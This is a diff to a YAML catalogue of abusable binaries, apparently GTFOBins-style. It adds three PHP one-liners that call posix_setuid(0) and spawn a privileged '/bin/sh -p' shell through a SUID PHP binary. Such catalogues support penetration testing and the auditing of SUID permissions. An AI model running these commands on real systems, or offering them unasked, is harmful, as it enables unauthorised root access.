@@ -64,7 +64,9 @@ functions:
         - CAP_SETUID
       sudo:
       suid:
-        shell: true
+        code: |-
+          php -r 'posix_setuid(0); system("/bin/sh -p -i");'
+        shell: false
       unprivileged:
     tty: false
   - code: |-
@@ -77,7 +79,9 @@ functions:
         - CAP_SETUID
       sudo:
       suid:
-        shell: true
+        code: |-
+          php -r 'posix_setuid(0); passthru("/bin/sh -p -i");'
+        shell: false
       unprivileged:
     tty: false
   - code: |-
@@ -90,7 +94,9 @@ functions:
         - CAP_SETUID
       sudo:
       suid:
-        shell: true
+        code: |-
+          php -r 'posix_setuid(0); $h=@popen("/bin/sh -p -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+        shell: false
       unprivileged:
     tty: false
   - code: |-
